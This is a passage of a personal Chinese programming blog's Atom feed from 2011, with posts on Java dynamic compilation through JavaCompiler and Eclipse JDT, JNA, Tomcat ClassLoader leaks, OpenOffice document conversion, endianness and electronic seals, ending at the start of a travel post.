   <id>http://hackfisher.github.com/blog/2011/07/java-dynamic-compilation</id>
   <content type="html">&lt;strong&gt;什么是动态编译?&lt;/strong&gt;

动态编译，我理解就是在执行期临时编译，并调用。我们都知道Java语言在运行前都会经过javac编译成.class文件，打包成jar，然后在JVM下用java执行。一般情况下，.class文件在运行时都是已经编译好的，不会有任何变化。而动态编译一般则指的是，在运行时调用Java编译器对Java源代码(Java Souce)进行编译，生成.class文件，或者不生成.class文件直接得到Class类，通过类的反射实例化得到对象，进行调用等操作。

&lt;a href=&quot;http://baike.baidu.com/view/3195155.htm&quot;&gt;动态编译&lt;/a&gt;是某些程式语言在执行时用来增进效能的方法。尽管这技术源于Self但使用此技术最为人所知的是Java。它可以做一些只在执行时才能得知的最佳化。使用动态编译的执行环境 一开始几分钟执行慢，之后，完成大部分的编译和再编译后，会执行快。因为初始效能的延迟，动态编译不适用于一些情况。在许多实作中，一些可以在编译时期做的最佳化被延到执行时期才编译，导致不必要的效能降低。即时编译是一种动态编译的形式。Java语言标准上，是要JDK5以上才开始支持Java动态编译的，但是在JDK1.4下面也可以通过其他方式实现。

&lt;strong&gt;先说说Java6下如何进行动态编译？&lt;/strong&gt;
因为Java6本身就是支持动态编译的，所以相对来说比较容易。如要认识如下几个类就行了:
ToolProvider, JavaCompiler, JavaFileObject, DiagnosticCollector, 还有常见的ClassLoader和Class.

网上的例子有很多，随便找了&lt;a href=&quot;http://blog.csdn.net/gumanren/article/details/4829748&quot;&gt;一个&lt;/a&gt;参考一下，懒得自己写了.

&amp;nbsp;
&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;package com.test;

import java.io.IOException;
import java.lang.reflect.Method;
import java.net.URI;
import java.util.Arrays;

import javax.tools.JavaCompiler;
import javax.tools.JavaFileObject;
import javax.tools.SimpleJavaFileObject;
import javax.tools.StandardJavaFileManager;
import javax.tools.ToolProvider;

public class CompileString {
public static void main(String[] args) throws Exception {
JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
System.out.println(&quot;&quot;+ToolProvider.getSystemJavaCompiler());
StandardJavaFileManager fileManager = compiler.getStandardFileManager(
null, null, null);

StringObject so = new StringObject(
&quot;CalculatorTest&quot;,
&quot;class CalculatorTest {&quot;
+ &quot; public int multiply(int multiplicand, int multiplier) {&quot;
+ &quot; System.out.println(multiplicand);&quot;
+ &quot; System.out.println(multiplier);&quot;
+ &quot; return multiplicand * multiplier;&quot; + &quot; }&quot; + &quot;}&quot;);

JavaFileObject file = so;

Iterable files = Arrays.asList(file);
JavaCompiler.CompilationTask task = compiler.getTask(null, fileManager,
null, null, null, files);

Boolean result = task.call();
System.out.println(result);
if (result) {
Class clazz = Class.forName(&quot;CalculatorTest&quot;);

Object instance = clazz.newInstance();

Method m = clazz.getMethod(&quot;multiply&quot;, new Class[] { int.class,
int.class });

Object[] o = new Object[] { 3, 2 };
System.out.println(m.invoke(instance, o));
}
}
}

class StringObject extends SimpleJavaFileObject {
private String contents = null;

public StringObject(String className, String contents) throws Exception {
super(URI.create(&quot;string:///&quot; + className.replace('.', '/')
+ Kind.SOURCE.extension), Kind.SOURCE);
this.contents = contents;
}

public CharSequence getCharContent(boolean ignoreEncodingErrors)
throws IOException {
return contents;
}
}&lt;/pre&gt;
&amp;nbsp;

&lt;strong&gt;JDK1.4下如何实现动态编译?&lt;/strong&gt;
理论上1.4的JDK是不支持动态编译的，但是还是可以想一些办法的，一种方式说是用tools.jar。哪个tools.jar? 就是JDK自带JAVA_HOME/lib/tools.jar，jdk1.4就是用它来编译Java源代码的，所以有人想到了用它来实现动态编译。

首先让我们来分析一下java源文件的编译, tool.jar里面有个com.sun.tools.javac.Main类，javac命令是调用“JAVA_HOME/lib/tools.jar”中的“com.sun.tools.javac.Main”的compile方法来编译：

&amp;nbsp;
&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;public static int compile(String as[]);

public static int compile(String as[], PrintWriter printwriter);&lt;/pre&gt;
&amp;nbsp;

但是这个tool.jar用起来很不方便，也没有源代码。简单的直接从源文件生成.class文件还是可以的，但是如果希望不生成.class文件，编译输出的byte[]直接放在内存里似乎就不太好控制了，因为我希望可以直接生成Class而没有中间的临时文件。tools.jar功能太简单，有时还会遇到&lt;a href=&quot;http://www.blogjava.net/pandawang/archive/2006/08/20/64639.html&quot;&gt;一些问题&lt;/a&gt;。

于是只能想其他方式了，有一个Java程序员们容易忽略的细节对我们很有帮助，尤其是那些使用eclipse IDE的程序员们。如果你问他们Eclipse进行代码编译是用的外部安装的JDK，还是用的自带的编译器，大部分人都答不出来，毕竟这属于Eclipse内部的构造。但是如果你进行过Eclipse Plugin开发，你可能会知道Eclipse有个叫JDT的组件，Eclipse是用的他自带的Java编译器，而且这个自带的编译器还很强大，下面我们就介绍如果用JDT实现JDK1.4下面的动态编译，并且可以编译后直接生成Class。

主程序：
&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;public static void main(String[] args) throws Exception {
CustomCompiler customCompiler = new CustomCompiler(
new PrintWriter(System.out),
new PrintWriter(System.err),
false /* systemExit */,
null /* options */,
null
);

customCompiler.pakageSourceMap.put(&quot;jdt/X.java&quot;, inputStream2String(CompileMain.class.getResourceAsStream(&quot;X.tpl&quot;), &quot;utf-8&quot;));

customCompiler
.compile(org.eclipse.jdt.internal.compiler.batch.Main.tokenize(&quot;&quot;));

try {
Class clazz = customCompiler.classLoader.loadClass(&quot;jdt.X&quot;);
Object obj = clazz.newInstance();

Method method = clazz.getDeclaredMethod(&quot;value&quot;, new Class[0]);
Object value = method.invoke(obj, new Object[]{});

System.out.println(value);
} catch (Exception e) {
e.printStackTrace();
}
}&lt;/pre&gt;
&amp;nbsp;

待动态编译的Java Source的内容:

&amp;nbsp;
&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;package jdt;

public class X {

public int value() {
return 2 + 3 * 4;
}

}&lt;/pre&gt;
&amp;nbsp;

期望输出的值是14.

&lt;strong&gt;步骤一：&lt;/strong&gt;
首先需要用到JDT的Jar包，这个可以从eclipse安装目录下面的plugins下面找到，eclipse的部分版本还会自带源代码，可以通过&lt;a title=&quot;Eclipse Compare&quot; href=&quot;http://www.eclipse.org/downloads/compare.php&quot; target=&quot;_blank&quot;&gt;这个地址&lt;/a&gt;比较下载

&amp;nbsp;

&lt;strong&gt;步骤二:&lt;/strong&gt;
实现一个CustomCompiler覆盖默认的org.eclipse.jdt.internal.compiler.batch.Main

&amp;nbsp;
&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;package jdt;

import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Map;

import org.eclipse.jdt.core.compiler.CharOperation;
import org.eclipse.jdt.core.compiler.CompilationProgress;
import org.eclipse.jdt.internal.compiler.ClassFile;
import org.eclipse.jdt.internal.compiler.CompilationResult;
import org.eclipse.jdt.internal.compiler.batch.CompilationUnit;
import org.eclipse.jdt.internal.compiler.batch.Main;
import org.eclipse.jdt.internal.compiler.impl.CompilerOptions;
import org.eclipse.jdt.internal.compiler.impl.CompilerStats;
import org.eclipse.jdt.internal.compiler.util.HashtableOfObject;
import org.eclipse.jdt.internal.compiler.util.Util;

public class CustomCompiler extends Main {
ClassLoaderImpl classLoader = null;
java.util.Map pakageSourceMap = new java.util.HashMap();

public CustomCompiler(PrintWriter outWriter, PrintWriter errWriter,
boolean systemExitWhenFinished, Map customDefaultOptions,
CompilationProgress compilationProgress) {
super(outWriter, errWriter, systemExitWhenFinished, customDefaultOptions,
compilationProgress);
classLoader = new ClassLoaderImpl(CustomCompiler.class.getClassLoader());
}

public void configure(String[] argv) {
ArrayList bootclasspaths = new ArrayList(DEFAULT_SIZE_CLASSPATH);
String sourcepathClasspathArg = null;
ArrayList sourcepathClasspaths = new ArrayList(DEFAULT_SIZE_CLASSPATH);
ArrayList classpaths = new ArrayList(DEFAULT_SIZE_CLASSPATH);
ArrayList extdirsClasspaths = null;
ArrayList endorsedDirClasspaths = null;

String customEncoding = null;

if (this.maxRepetition == 0) {
this.maxRepetition = 1;
}
if (this.maxRepetition &amp;gt;= 3 &amp;amp;&amp;amp; (this.timing &amp;amp; TIMING_ENABLED) != 0) {
this.compilerStats = new CompilerStats[this.maxRepetition];
}

setPaths(bootclasspaths,
sourcepathClasspathArg,
sourcepathClasspaths,
classpaths,
extdirsClasspaths,
endorsedDirClasspaths,
customEncoding);
}

// 覆盖，不输出成为.class文件
public void outputClassFiles(CompilationResult unitResult) {
if (!((unitResult == null) || (unitResult.hasErrors() &amp;amp;&amp;amp; !this.proceedOnError))) {
ClassFile[] classFiles = unitResult.getClassFiles();

for (int i = 0; i &amp;lt; classFiles.length; i ++) {
ClassFile classFile = classFiles[i];
char[] filename = classFile.fileName();

CharOperation.replace(filename, '/', '.');

classLoader.add(new String(filename), classFile);
}
}
}

/*
* Build the set of compilation source units
*/
public CompilationUnit[] getCompilationUnits() {
Iterator iterator = pakageSourceMap.entrySet().iterator();

int classCount = pakageSourceMap.size();
CompilationUnit[] units = new CompilationUnit[classCount];

HashtableOfObject knownFileNames = new HashtableOfObject(classCount);
String defaultEncoding = (String) this.options.get(CompilerOptions.OPTION_Encoding);
if (Util.EMPTY_STRING.equals(defaultEncoding))
defaultEncoding = null;
String encoding = defaultEncoding;

int i = 0;
while (iterator.hasNext()) {
Map.Entry entry = (Map.Entry)iterator.next();
String filename = (String)entry.getKey();
String source = (String)entry.getValue();

char[] charName = filename.toCharArray();
if (knownFileNames.get(charName) != null)
throw new IllegalArgumentException(this.bind(&quot;unit.more&quot;, filename)); //$NON-NLS-1$
knownFileNames.put(charName, charName);

units[i] = new CompilationUnit(source.toCharArray(), filename, encoding,
null);
}
return units;
}
}&lt;/pre&gt;
&amp;nbsp;

&lt;strong&gt;步骤三：&lt;/strong&gt;如果希望直接得到Class对象，而不生成临时.class文件，有一个关键的ClassLoaderImpl，可以直接通过byte[]生成Class, defineClass(qualifiedClassName, bytes, 0, bytes.length)
&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;package jdt;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.util.Collection;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;

import org.eclipse.jdt.internal.compiler.ClassFile;

/**
* A custom ClassLoader which maps class names to JavaFileObjectImpl instances.
*/
public final class ClassLoaderImpl extends ClassLoader {
private final Map/**/ classes = new HashMap();

ClassLoaderImpl(final ClassLoader parentClassLoader) {
super(parentClassLoader);
}

/**
* @return An collection of JavaFileObject instances for the classes in the
* class loader.
*/
Collection/**/ files() {
return Collections.unmodifiableCollection(classes.values());
}

protected Class findClass(final String qualifiedClassName) throws ClassNotFoundException {
ClassFile file = (ClassFile)classes.get(qualifiedClassName);
if (file != null) {
byte[] bytes = file.getBytes();
return defineClass(qualifiedClassName, bytes, 0, bytes.length);
}
// Workaround for &quot;feature&quot; in Java 6
// see http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=6434149
try {
Class c = Class.forName(qualifiedClassName);
return c;
} catch (ClassNotFoundException nf) {
// Ignore and fall through
}
return super.findClass(qualifiedClassName);
}

void add(final String qualifiedClassName, final ClassFile classFile) {
classes.put(qualifiedClassName, classFile);
}

protected synchronized Class loadClass(final String name, final boolean resolve) throws ClassNotFoundException {
return super.loadClass(name, resolve);
}

public InputStream getResourceAsStream(final String name) {
if (name.endsWith(&quot;.class&quot;)) {
String qualifiedClassName = name.substring(0, name.length() - &quot;.class&quot;.length()).replace('/', '.');
ClassFile file = (ClassFile) classes.get(qualifiedClassName);
if (file != null) {
return new ByteArrayInputStream(file.getBytes());
}
}
return super.getResourceAsStream(name);
}
}&lt;/pre&gt;
&amp;nbsp;

&lt;strong&gt;补充：&lt;/strong&gt;如果不需要直接生成Class，就不用这么麻烦了，直接如下几行代码就可以搞定了:
&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;BatchCompiler.compile(&quot;E:\\sources\\X.java -d E:\\output&quot;,
new PrintWriter(System.out),
new PrintWriter(System.err),
null);&lt;/pre&gt;
&lt;strong&gt;动态编译的应用&lt;/strong&gt;
动态编译技术的应用应该不少，目前JVM上的很多动态语言，比如Scala和Clojure等，也好像用到了这种动态编译的技术。另外还有一些Java引用的DSL语言，也有用动态编译技术，配合预处理，缓存技术来提高性能，比如&lt;a title=&quot;SimpleEL&quot; href=&quot;http://www.iteye.com/topic/993292&quot; target=&quot;_blank&quot;&gt;SimpleEL&lt;/a&gt;。

&lt;strong&gt;参考资料:&lt;/strong&gt;
[1] http://www.iteye.com/topic/993292
[2] http://topic.csdn.net/u/20080318/10/63e0b728-0385-4b81-b483-73b2b8c60250.html
[3] http://www.blogjava.net/pandawang/archive/2006/08/20/64639.html
[4] http://stackoverflow.com/questions/5423052/eclipse-jdt-tutorials
[5] http://www.eclipse.org/forums/index.php?t=thread&amp;amp;frm_id=13
[6] http://stackoverflow.com/questions/121324/a-java-api-to-generate-java-source-files
[7] http://www.vogella.de/articles/EclipseJDT/article.html#jdt_newelements
[8] http://jeval.sourceforge.net/
[9] http://www.eclipse.org/downloads/compare.php
[10] http://blog.csdn.net/gumanren/article/details/4829748
</content>
 </entry>
 
 <entry>
   <title>JNA, Java Native开发利器</title>
   <link href="http://hackfisher.github.com/blog/2011/06/jna-java-native"/>
   <updated>2011-06-30T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/06/jna-java-native</id>
   <content type="html">简单的来说，这篇文章就是介绍一个十分好用的Java Native开发工具, JNA。

在Java编程中，大部分时间都不需要理会JNI，但是当你需要调用一个本地的C/C++库的时候，你就不得不考虑如果在Java中调用C库中的接口(dll, so)。这样的情况有很多，比如当你需要访问一个硬件时，而硬件厂商只提供C语言写的驱动和库文件。

刚开始，或许像我一样，大部分人知道Java有一个叫JNI的东西可以做到这一点，还不坏不是么，至少可以实现它。但是JNI的编写相当复杂和拙劣，关键的一点是需要编写C代码，要知道这对于相当一部分Java程序员来说可不是一个容易的事情。除了你要精通C语言，还要熟悉JNI的知识，包括C的数据类型如何对应到JNI的C数据类型，又如何对应到Java的数据类型，还有很多其他的细节需要注意，比如垃圾回收的问题，还有结构体数据类型对应问题，跨平台问题等等都足以把你搞得头大。很多情况下，只不过是为了调用一个第三方库，不得不再造出自己的一个库，不得不编写JNI代码和本地代码。我为什么不能直接调用本地库代码?

直到有那么一天，某个人告诉你有个叫JNA的东西，就是专门用来解决这个问题的。像下面这个&lt;a title=&quot;JNA GettingStartted&quot; href=&quot;https://github.com/twall/jna/blob/master/www/GettingStarted.md&quot; target=&quot;_blank&quot;&gt;例子&lt;/a&gt;这么简单。

&amp;nbsp;
&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;package com.sun.jna.examples;

import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.Platform;

/** Simple example of JNA interface mapping and usage. */
public class HelloWorld {

// This is the standard, stable way of mapping, which supports extensive
// customization and mapping of Java to native types.

public interface CLibrary extends Library {
CLibrary INSTANCE = (CLibrary)
Native.loadLibrary((Platform.isWindows() ? &quot;msvcrt&quot; : &quot;c&quot;),
CLibrary.class);

void printf(String format, Object... args);
}

public static void main(String[] args) {
CLibrary.INSTANCE.printf(&quot;Hello, World\n&quot;);
for (int i=0;i &amp;lt; args.length;i++) {
CLibrary.INSTANCE.printf(&quot;Argument %d: %s\n&quot;, i, args[i]);
}
}
}&lt;/pre&gt;
&amp;nbsp;

使用JNA，你甚至不需要很多的文档，只要拿到第三方库的头文件，比如third.h，根据里面的函数定义直接生成Java的代码，几分钟就可以搞定。Java和本地C库的映射，可以根据头文件直接生成，甚至不用开发人员手动编写对应关系。要用哪几个函数，就在Java接口中添加哪几个函数。你可以按照自己想要的方式加载本地库(如果你曾被JNI下面System.loadLibrary那捉摸不定的java.library.path搞得生不如死)，JNA还可以做到C结构体和Java类的映射，如果你需要在Java中，向本地方法传递结构体，这就会很有用:

&amp;nbsp;
&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;public static class SYSTEMTIME extends Structure {
public short wYear;
public short wMonth;
public short wDayOfWeek;
public short wDay;
public short wHour;
public short wMinute;
public short wSecond;
public short wMilliseconds;
}

void GetSystemTime(SYSTEMTIME result);&lt;/pre&gt;
&amp;nbsp;

相比较与JNI来说，JNA也有它的缺点，其实JNA是建立与JNI的基础之上的，所以如果对性能要求特别高，那么多花点时间在JNI上面也许是值得的。另外，JNA在Java调用底层C库的时候特别方便，但是反过来，如果想要从C里面调用Java，JNA可能会遇到不小的麻烦，这时候你也许需要转回到JNI.

如果你还对Java的Native开发心有余悸，希望这篇介绍的JNA的文章可以帮助你跨越JNI开发的这道鸿沟:)
</content>
 </entry>
 
 <entry>
   <title>ClassLoader Memory Leak: Detection and Protection in Tomcat</title>
   <link href="http://hackfisher.github.com/blog/2011/06/classloader-leak-protection-in-tomcat"/>
   <updated>2011-06-28T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/06/classloader-leak-protection-in-tomcat</id>
   <content type="html">最近在tomcat 6下面重新部署应用时，发现了下面一个抛错，非常困惑，所以就研究了一下。

org.apache.catalina.loader.WebappClassLoader clearThreadLocalMap严重: The web application [/test] created a ThreadLocal with key of type [java.lang.ThreadLocal] (value [java.lang.ThreadLocal@c47498]) and a value of type [XXX] (value [XXX@1c2dad7]) but failed to remove it when the web application was stopped.

按道理，ThreadLocal在线程关闭时，会自动被垃圾回收器回收，所以一般就算不remove也没有关系，交给Thread了。那为什么这边会有抛错，非常不解, Tomcat这么做肯定有它的道理，是为了解决什么问题呢？

仔细分析后发现，Web容器中线程在不同的Request和Servlet之间是会重复利用的，包括undeploy之后deploy，线程还会存在，从某种意义上就有点像全局变量。也就是说，在应用重新部署后ThreadLocal并不会被remove，那如果ThreadLocal里面放的对象很小，毕竟是全局的，虽然一直存在，但也不至于造成什么严重的问题，Tomcat实现&lt;a title=&quot;memory-leak-protection-tomcat&quot; href=&quot;http://java.dzone.com/articles/memory-leak-protection-tomcat&quot; target=&quot;_blank&quot;&gt;Detection and Protection in Tomcat&lt;/a&gt;是不是多此一举？

原来并非这么简单，真正的罪魁祸首是ClassLoader Memory Leak，基于如下重要事实:

&lt;strong&gt;0. 一般的应用服务器比如Tomcat或者Glassfish因为要实现应用的模块化，从而可以动态的undeploy或者deploy应用(.war, .ear, etc)， 并且可以实现&lt;a title=&quot;热部署&quot; href=&quot;http://baike.baidu.com/view/5036687.htm&quot; target=&quot;_blank&quot;&gt;热部署&lt;/a&gt;，不需要重启服务器，所以每个应用都会有自己的WebappClassLoader。&lt;/strong&gt;

&lt;strong&gt;1. 每一个实例对象，比如XServlet instance都保有它对应class的引用，比如XServlet.class&lt;/strong&gt;

&lt;strong&gt;2. 每一个class对象，比如XServlet.class或者在XServlet里面第一次加载的class, 都会保有当前加载它的那个class loader引用，也就是当前对象的classloader.&lt;/strong&gt;

&lt;strong&gt;3. 每个class loader都会保有所有它加载的class对象的引用。&lt;/strong&gt;

就拿上面的ThreadLocal举例，因为threadLocal.get()里面引用的对象的class可能是在当前WebappClassLoader里面加载的，所以如果undeploy时，如果threadLocal没有remove，那么直接导致当前的appClassLoader及其加载的所有对象和class无法回收，结果就是Memory Leak! 如果加载的类class不断变多，占用内存超过PermGen大小，还会导致&quot;java.lang.OutOfMemoryError: PermGen space&quot; 异常。

&lt;strong&gt;结论: 如果当前应用外部保有对象的类class是在改应用的classloader中加载的，那么就会导致一个classloader泄漏。&lt;/strong&gt;

自然，这里的当前应用外部保有的引用就包括全局引用和ThreadLocal线程作用域引用，所以不光ThreadLocal要注意，其他的地方如全局变量可能也要注意。另外，等待Web容器解决这个问题是不现实的， 我在想要不要弄一个RequestLocal代替ThreadLocal和其他全局变量。

关于ClassLoader Leaks，参考资料里面有两篇解释的非常好的文章，特别是里面举了一个全局变量的例子，非常生动：就算如下代码也是会有类似问题的。

&amp;nbsp;
&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;package com.stc.test;

import java.io.\*;
import java.util.logging.\*;
import javax.servlet.\*;
import javax.servlet.http.\*;

public class MyServlet extends HttpServlet {
protected void doGet(HttpServletRequest request, HttpServletResponse response)
throws ServletException, IOException {
// Log at a custom level
Level customLevel = new Level(&quot;OOPS&quot;, 555) {};
Logger.getLogger(&quot;test&quot;).log(customLevel, &quot;doGet() called&quot;);
}
}&lt;/pre&gt;
&amp;nbsp;

参考资料：

[1] &lt;a href=&quot;http://blogs.oracle.com/fkieviet/entry/classloader_leaks_the_dreaded_java&quot;&gt;http://blogs.oracle.com/fkieviet/entry/classloader_leaks_the_dreaded_java&lt;/a&gt;

[2]&lt;a href=&quot;http://blogs.oracle.com/fkieviet/entry/how_to_fix_the_dreaded&quot;&gt;http://blogs.oracle.com/fkieviet/entry/how_to_fix_the_dreaded&lt;/a&gt;

[3]&lt;a href=&quot;http://java.dzone.com/articles/memory-leak-protection-tomcat&quot;&gt;http://java.dzone.com/articles/memory-leak-protection-tomcat&lt;/a&gt;

[4]&lt;a href=&quot;http://wiki.apache.org/tomcat/MemoryLeakProtection&quot;&gt;http://wiki.apache.org/tomcat/MemoryLeakProtection&lt;/a&gt;

[5]&lt;a href=&quot;http://www.iteye.com/topic/75440&quot;&gt;http://www.iteye.com/topic/75440&lt;/a&gt;
</content>
 </entry>
 
 <entry>
   <title>Java平台利用OpenOffice实现不同Office文件格式的转化，比如将Word转换成Html</title>
   <link href="http://hackfisher.github.com/blog/2011/06/word_to_html"/>
   <updated>2011-06-23T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/06/word_to_html</id>
   <content type="html">首先刚开始，除了Google, Baidu之外，还有一个重要的去处，那就是stackoverflow，现在经常可以在上面得到我想要的答案。下面是stackoverflow上面关于这个topic的讨论。

&lt;a href=&quot;http://stackoverflow.com/questions/227236/convert-word-doc-to-html-programmatically-in-java&quot;&gt;Convert Word doc to HTML programmatically in Java&lt;/a&gt;

似乎没有简单的纯Java第三方库，可以将Word转化成Html，有一些需要自己大量动手，比如有人提供了MS关于.doc文件格式的规格文档，说用POI先将其读取成Java对象，再利用HTML Tag先出。这样无疑会遇到大量的细节，实现起来也很麻烦。

http://www.oooninja.com/2008/02/batch-command-line-file-conversion-with.html
有一个方案是：OpenOffice Service + jodconverter
JODConverter, the Java OpenDocument Converter，是一个利用OpenOffice提供各种Office格式转化的类库，

之所以这么选择的原因有：
1. OpenOffice Service就像数据库服务一样，提供实际各种转化。需要在主机上部署，这里有&lt;a href=&quot;http://www.artofsolving.com/node/10&quot;&gt;文档&lt;/a&gt;

2. JODConverter提供了Java相关全面的接口和支持，文档齐全。

3. 这种方式，比用POI等做转换，更可靠成本更低。比那些用Native API调用的跟开放，更可控一些。稳定性是建立在OpenOffice之上的，并且OpenOffice也是用Java写的，跨平台，可以比较好的部署

4. 麻烦的地方就在于需要部署OpenOffice，这是需要想想怎么给用户用的问题。不过如果拿OpenOffice和数据库服务比较，用户也容易更接受了
</content>
 </entry>
 
 <entry>
   <title>A Post Test from Android</title>
   <link href="http://hackfisher.github.com/blog/2011/06/a-post-test-from-android"/>
   <updated>2011-06-23T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/06/a-post-test-from-android</id>
   <content type="html">&lt;img style=&quot;display: block; margin-right: auto; margin-left: auto;&quot; src=&quot;/uploads/2011/06/wpid-t.jpg&quot; alt=&quot;image&quot; /&gt;

发自Android手机的一篇文章，测试WordPress for Andriod, 可以从安卓市场中下到。

使用起来还是没有电脑方便，看来写文章还是离不开电脑。而且用的是wifi，gprs不知速度怎么样。
</content>
 </entry>
 
 <entry>
   <title>Little-Endian和Big-Endian理解</title>
   <link href="http://hackfisher.github.com/blog/2011/06/little_endian_big_endian"/>
   <updated>2011-06-16T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/06/little_endian_big_endian</id>
   <content type="html">1. Big-Endian，表示“高字节在内存的低地址”。在Big-Endian的计算机中，变量的高字节在前;
Little-Endian，表示“低字节在内存的低地址”。在Little-Endian的计算机中，变量的低字节在前

2. Little-Endian更容易理解和记忆，Bing-Endian更直观，因为其表示和hex字符串方式相同

3. 网络字节序、Java、Macintosh、Keil C51采用Big-Endian, X86系列采用Little-Endian

4. 字节数组在不同的Little-Endian和Big-Endian下表现相同，位置在前面的仍然在前面

5. 与字节内的bit位的顺序无关，也就是同一个字节在不同Endian下面是一样的，Little-Endian和Big-Endian指的是字节解释序。

6. 一般只有那些位数大于一个字节的数据在存储或者传输时才会遇到这个问题，位数高的是放在低位还是放在高位，是放在前面还是放在后面。比如int,long,short等等。一些自定义的数据类型，比如如果拥有3个字节的数据，也会遇到这个表示和解释的问题。但是整个的文件（一个大的字节数组同4）字节顺序表示已一样。endian是相对于数据类型的表示而言的
http://www.ixpub.net/thread-1430643-1-1.html

7. 在自己的二进制文件中，自定义的数据类型，可以采用big-edian或者little-edian两种方式之一来存储和传输。

8. 可以通过拿出数据中的字节判断，来判断这个系统的endian

9. Java 是big-endian:
&lt;pre escaped=&quot;true&quot; lang=&quot;java&quot; line=&quot;1&quot;&gt;DataOutputStream.writeInt(int)
public final void writeInt(int v) throws IOException {
        out.write((v &amp;gt;&amp;gt;&amp;gt; 24) &amp;amp; 0xFF);
        out.write((v &amp;gt;&amp;gt;&amp;gt; 16) &amp;amp; 0xFF);
        out.write((v &amp;gt;&amp;gt;&amp;gt;  8) &amp;amp; 0xFF);
        out.write((v &amp;gt;&amp;gt;&amp;gt;  0) &amp;amp; 0xFF);
        incCount(4);
}

DataInputStream.readInt() : int

public final int readInt() throws IOException {
        int ch1 = in.read();
        int ch2 = in.read();
        int ch3 = in.read();
        int ch4 = in.read();
        if ((ch1 | ch2 | ch3 | ch4) &amp;lt; 0)
            throw new EOFException();
        return ((ch1 &amp;lt;&amp;lt; 24) + (ch2 &amp;lt;&amp;lt; 16) + (ch3 &amp;lt;&amp;lt; 8) + (ch4 &amp;lt;&amp;lt; 0));
}&lt;/pre&gt;
其实也可以有对应的little-endian表示方式
</content>
 </entry>
 
 <entry>
   <title>电子签章分析</title>
   <link href="http://hackfisher.github.com/blog/2011/06/e_signature_analysis"/>
   <updated>2011-06-16T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/06/e_signature_analysis</id>
   <content type="html">像任何传统的签名签章一样，电子签章必须能够起到认证的作用，同时应该能够起到法律效力的作用，满足&lt;a title=&quot;电子签章法&quot; href=&quot;http://wenku.baidu.com/view/3ceb6700bed5b9f3f90f1cf4.html&quot; target=&quot;_blank&quot;&gt;&amp;lt;电子签章法&amp;gt;&lt;/a&gt;里面规定必须满足的条件，否则没有法律效力的电子签章，即使具有签章的作用，也没有实际的意义，很难满足一般客户的需求。
电子签章必须能够能够保证如下几点:

1. 文件的真实性。保证文件没有篡改过，如果修改过，测电子签章失效。(一般做法是如果修改过，则在电子签章上显示红色文档被修改过，相关技术可以用md5等对全文进行hash验证)
2. 电子签章的真实性，必须不容易假冒。因为电子签章和真实的签名一样，具有完全的法律效力，所以必须不能假冒。想想如果现实中如果有人能够假冒你的手写签名，并且不被识别会是什么后果? 所以以前理解的&quot;就是简单的贴个图片上去&quot;是错误的说法。需要通过相关密码学技术来保证。比如RSA等非对称加密手段，签章时用私钥，验证时用公钥，可以有一个CA来做公证。
因为私钥只有你有，其他人不知道，随便弄个私钥，解密出来是不对的。私钥的存储方式有文件，usb key(类似加密锁)等等，如果用过网银就清楚了，目前电子签章的需求也主要来自于电子商务，OA办公等领域。
3. 文件的不可抵赖性。也是通过上面的非对称加密技术来保证的。因为只有你有私钥，别人无法加密，逆否，如果加密了，肯定是你弄得，怎么抵赖？
综上，作为电子签章的的基本元素之一，文档文件，我们要搞清楚这个元素指的是什么？ PDF，Word, 还是HTML，还是数据库里面的记录。如果缺少这个基本元素文件的范围的界定，电子签章无从谈起。
另外，关于所说的第三方电子签章控件的接口，无论是类似activeX控件，还是其他的第三方控件，都会提供相应的接口，这个都无所谓，只要能够提供这些控件需要调用的接口，比如读取文件内容，写入电子签章，读取电子签章内容，访问CA地址等等，技术上应该可以实现。具体做法，可以找一个电子签章厂商试用集成一下，这些东西都容易搞清楚了。

参考资料：

[1] 电子签章法： &lt;a href=&quot;http://wenku.baidu.com/view/3ceb6700bed5b9f3f90f1cf4.html&quot;&gt;http://wenku.baidu.com/view/3ceb6700bed5b9f3f90f1cf4.html&lt;/a&gt;

[2]第三方电子签章控件技术说明书接口：&lt;a href=&quot;http://www.doc88.com/p-98341236956.html&quot;&gt;http://www.doc88.com/p-98341236956.html&lt;/a&gt;

[3]原理性介绍： &lt;a href=&quot;http://wenku.baidu.com/view/c21da9de5022aaea998f0faa.html&quot;&gt;http://wenku.baidu.com/view/c21da9de5022aaea998f0faa.html&lt;/a&gt;

[4]PKI的电子签章系统的实现：&lt;a href=&quot;http://www.doc88.com/p-34180437919.html&quot;&gt;http://www.doc88.com/p-34180437919.html&lt;/a&gt;
</content>
 </entry>
 
 <entry>
   <title>五.一上海行</title>
   <link href="http://hackfisher.github.com/blog/2011/05/tour_shanghai"/>
   <updated>2011-05-31T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2011/05/tour_shanghai</id>
   <content type="html">&lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;上海城隍庙&lt;/strong&gt;&lt;/p&gt;
